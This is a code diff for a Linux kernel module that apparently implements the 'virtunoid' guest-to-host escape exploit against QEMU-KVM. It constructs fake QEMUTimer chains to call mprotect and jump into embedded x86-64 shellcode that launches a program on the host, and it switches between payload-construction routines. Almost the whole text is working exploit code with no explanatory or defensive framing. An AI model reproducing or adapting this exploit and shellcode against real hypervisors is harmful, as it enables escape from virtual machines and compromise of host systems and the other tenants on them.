@@ -12,7 +12,6 @@
 #include <asm/io.h>		// for virt_to_phys()
 
 #include "virtunoid-config.h"
-//#include "shellcode-config.h"
 #define QEMU_GATEWAY  0x0202000a //"10.0.2.2"
 //#define QEMU_GATEWAY  0x017aa8c0//"192.168.122.1"
 
@@ -337,46 +336,12 @@ uint32_t addr_page_offset(unsigned long addr) {
     return addr & ((1 << PAGE_SHIFT) - 1);
 }
 
-gfn_t gva_to_gfn(gva_t addr) {
-    //static int fd = -1;
-    struct file *fd = NULL;
-    //size_t off;
-    loff_t off;
-    uint64_t pte, pfn;
-    int len=0;
-
-    if (fd == NULL)
-        fd = file_open("/proc/self/pagemap", O_RDONLY, 0);
-        //fd = open("/proc/self/pagemap", O_RDONLY);
-    if (fd == NULL)
-        die_errno("open");
-    off = ((uintptr_t)addr >> 9) & ~7;
-    //if (lseek(fd, off, SEEK_SET) != off)
-    if (generic_file_llseek(fd, off, SEEK_SET) != off)
-        die_errno("lseek");
-
-    //if (vfs_read(fd, (unsigned char *)&pte, 8, 0) != 8)
-    if ((len=file_read(fd, 0, (unsigned char *)&pte, 8)) != 8)//sys_read
-        die_errno("read");
-    if (!(pte & PFN_PRESENT))
-        return (gfn_t)-1;
-
-    pfn = pte & PFN_PFN;
-    return pfn;
-}
-
-gpa_t gva_to_gpa_j(gva_t addr) {
+gpa_t gva_to_gpa(gva_t addr) {
   unsigned long paddr = virt_to_phys(addr);
   printk("Translated virtual address %016lx to phys addr %016lx\n",
          (long unsigned int)addr,
          (long unsigned int)paddr);
   return paddr;
-}
-
-gpa_t gva_to_gpa(gva_t addr) {
-    gfn_t gfn = gva_to_gfn(addr);
-    assert(gfn != (gfn_t)-1);
-    return (gfn << PAGE_SHIFT) | addr_page_offset((unsigned long)addr);
 }
 
 hva_t highmem_hva_base = 0;
@@ -394,7 +359,7 @@ hva_t gva_to_hva(gva_t addr) {
             return r->hva + (addr - (gva_t)r->data);
         }
 
-    return gpa_to_hva(gva_to_gpa_j(addr));
+    return gpa_to_hva(gva_to_gpa(addr));
 }
 
 /*
@@ -410,7 +375,29 @@ struct shared_state {
 };
 
 static volatile page_aligned struct shared_state share = {
-  .prog = "/usr/bin/gnome-calculator"
+  .prog = "\x55\
+\x48\x8d\x2d\xf8\xff\xff\xff\
+\x31\xf6\x83\xc6\x02\
+\x31\xff\x83\xc7\x70\
+\x8b\x45\x67\
+\xff\xd0\
+\x48\x83\xec\x20\
+\x48\x8d\x45\x4d\
+\x48\x89\x44\x24\x10\
+\x31\xc0\x48\x89\x44\x24\x18\
+\x8b\x45\x6b\
+\xff\xd0\
+\x85\xc0\
+\x75\x15\
+\x48\x8d\x54\x24\x10\
+\x48\x8b\x02\
+\x48\x89\xd6\
+\x48\x89\xc7\
+\x8b\x45\x6f\
+\xff\xd0\
+\x48\x83\xc4\x20\
+\x5d\
+\xc3/usr/bin/gnome-calculator"
   
 };
 
@@ -451,17 +438,41 @@ struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, struct QEMUTimer *next) {
  * Construct a timer chain that performs an mprotect() and then calls
  * into shellcode.
  */
+struct QEMUTimer *construct_payload(void) {
+    struct IORange *ioport;
+    struct IORangeOps *ops;
+    struct QEMUTimer *timer;
+
+    ops = kmalloc(sizeof *ops, GFP_ATOMIC);
+    ops->read = MPROTECT;
+    ops->write = 0;
+
+    ioport = align_kmalloc(2*PAGE_SHIFT_SIZE);
+    ioport->ops = gva_to_hva(ops);
+    ioport->base = -(2*PAGE_SHIFT_SIZE);
+
+    share.shellcode = gva_to_hva(ioport);
+
+    memcpy(ioport + 1, shellcode, (void*)end_shellcode - (void*)shellcode);
+
+    timer = NULL;
+    timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);
+    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
+    timer = fake_timer(CPU_OUTL, 0, timer);
+    return timer;
+}
+
 struct QEMUTimer *construct_payload_j(void) {
     struct IORange *ioport;
     struct IORangeOps *ops;
     struct QEMUTimer *timer;
-    unsigned  long int mask = ~(PAGE_SIZE-1ull);
+    unsigned  long int mask = ~(PAGE_SHIFT_SIZE-1ull);
     //int i;
     int len = 0x69;//0x7c;
     uint8_t* ptr8;
     uint32_t* ptr32;
 
-         const char* sc = "\x55\
+    const char* sc1 = "\x55\
 \x48\x8d\x2d\xf8\xff\xff\xff\
 \x31\xf6\x83\xc6\x02\
 \x31\xff\x83\xc7\x70\
@@ -484,15 +495,12 @@ struct QEMUTimer *construct_payload_j(void) {
 \x48\x83\xc4\x20\
 \x5d\
 \xc3/usr/bin/gnome-calculator";
-         printk(sc);
-         len = strlen(sc)+1;
+    const char * sc = "/usr/bin/gnome-calculator";
+    printk(sc);
+    len = strlen(sc)+1;
 
     printk("shellcode len is %i\n",len);
-
-
     printk("mask is %016lx\n",mask);
-
-
     ops = kmalloc(sizeof *ops,GFP_ATOMIC);
     if (ops ==NULL){
         printk("kmalloc failed\n");
@@ -502,8 +510,7 @@ struct QEMUTimer *construct_payload_j(void) {
     ops->read = MPROTECT;
     ops->write = 0;
 
-
-    ioport = (struct IORange*) kmalloc(3*PAGE_SIZE,GFP_ATOMIC);
+    ioport = (struct IORange*) kmalloc(3*PAGE_SHIFT_SIZE,GFP_ATOMIC);
     printk("IORange size is %li\n",sizeof(struct IORange));
     printk("ioport is %016lx\n",(long unsigned int) ioport);
     printk("ioport + 1 is 0x%lx\n",(long unsigned int)((char*) (ioport+1)));
@@ -511,32 +518,21 @@ struct QEMUTimer *construct_payload_j(void) {
     mask = (long unsigned int)ioport;
 
     mask = mask >> 12;
-    mask = mask << 12;/*
-        for(i=0; i< 12;i++)
-      mask = mask /2 ;
+    mask = mask << 12;
+    /*for(i=0; i< 12;i++)
+        mask = mask /2 ;
     for(i=0; i < 12; i++)
-      mask = mask *2;
-                      */
+        mask = mask *2;*/
 
-    mask += PAGE_SIZE;
+    mask += PAGE_SHIFT_SIZE;
 
     ioport = (struct IORange*)mask;
-    /*  (
-                                 ((unsigned long int)ioport )
-                                 | ~(PAGE_SIZE-1)
-                                 )+PAGE_SIZE);*/
     printk("ioport is %016lx\n", (long unsigned int)ioport);
 
-
-
     ioport->ops = gva_to_hva(ops);
-    ioport->base = -(2*PAGE_SIZE);
-
-
+    ioport->base = -(2*PAGE_SHIFT_SIZE);
 
     share.shellcode = gva_to_hva(ioport);
-
-
 
     //printk("sc is 0x%x",*((int*)sc));
     //memcpy(ioport + 1, sc, len);
@@ -554,39 +550,13 @@ struct QEMUTimer *construct_payload_j(void) {
     timer = NULL;
     timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);//joke
 
-    //    timer = fake_timer(0xdeadbeef\xcafebabe,timer);
-
+    //timer = fake_timer(0xdeadbeef\xcafebabe,timer);
     //timer = fake_timer(0, 0 ,timer);//print 40ascii '@'
     //timer = fake_timer(CPU_OUTL, 0x5e155e, timer);//
     timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
     timer = fake_timer(CPU_OUTL, 0, timer);//0x5e155e
 
     printk("leaving construct_payload\n");
-    return timer;
-}
-
-
-struct QEMUTimer *construct_payload(void) {
-    struct IORange *ioport;
-    struct IORangeOps *ops;
-    struct QEMUTimer *timer;
-
-    ops = kmalloc(sizeof *ops, GFP_ATOMIC);
-    ops->read = MPROTECT;
-    ops->write = 0;
-
-    ioport = align_kmalloc(2*PAGE_SHIFT_SIZE);
-    ioport->ops = gva_to_hva(ops);
-    ioport->base = -(2*PAGE_SHIFT_SIZE);
-
-    share.shellcode = gva_to_hva(ioport);
-
-    memcpy(ioport + 1, shellcode, (void*)end_shellcode - (void*)shellcode);
-
-    timer = NULL;
-    timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);
-    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
-    timer = fake_timer(CPU_OUTL, 0, timer);
     return timer;
 }
 
@@ -646,41 +616,6 @@ uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr)
  *
  * See qemu-kvm:hw/mc146818rtc.c for the relevant code.
  */
-void wait_rtc_j(void) {
-    struct file *fd;
-    int val;
-    struct rtc_device *rtc;
-    int len=0;
-
-    if ((fd = file_open("/dev/rtc", O_RDONLY,0)) == NULL )//sys_open
-          die_errno("open(/dev/rtc)");
-      
-    if ((rtc = rtc_class_open("rtc0")) == NULL)
-        die_errno("open rtc0 failed");
-    //  mutex_unlock(&rtc->ops_lock);
-    rtc_update_irq_enable(rtc, 1);
-    printk("[+] UIE has been turned on\n");
-  
-    //int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
-    if ((len=file_read(fd,0, (unsigned char *)&val, sizeof val)) != sizeof(val)){//sys_read
-        printk("error in read()\n");
-  	printk("len was %i\n",len);
-  	printk("fd->f_op is %016lx\n",(long unsigned int)fd->f_op);
-  	printk("fd->f_op->read is %016lx\n",(long unsigned int)fd->f_op->read);
-  	printk("fd->f_op->aio_read is %016lx\n",(long unsigned int)fd->f_op->aio_read);
-  	printk("size of val is %li\n",sizeof val);
-  	
-  	while(1);
-    }
-  
-    rtc_update_irq_enable(rtc, 0);
-    printk("RTC_UIE turned off\n");
-    rtc_class_close(rtc);
-    file_close(fd);
-    outb(10,   0x70);
-    outb(0xF0, 0x71);
-}
-
 void wait_rtc(void) {
     struct file *fd;
     struct rtc_device *rtc;
@@ -807,7 +742,7 @@ static int __init server_init( void )
     printk("[+] Go!\n");
 
     //safe to here
-    timer->next   = gva_to_hva(construct_payload_j());
+    timer->next   = gva_to_hva(construct_payload());
     timer->expire_time = 0;
     //               while(1);
 
@@ -830,7 +765,6 @@ static void __exit server_exit( void )
 
 #include <asm/apic.h>
 void foo(void){
-    //#define APIC ((uint64_t*)0xffffffff81668678)
     apic->write(0,0);
 }
 
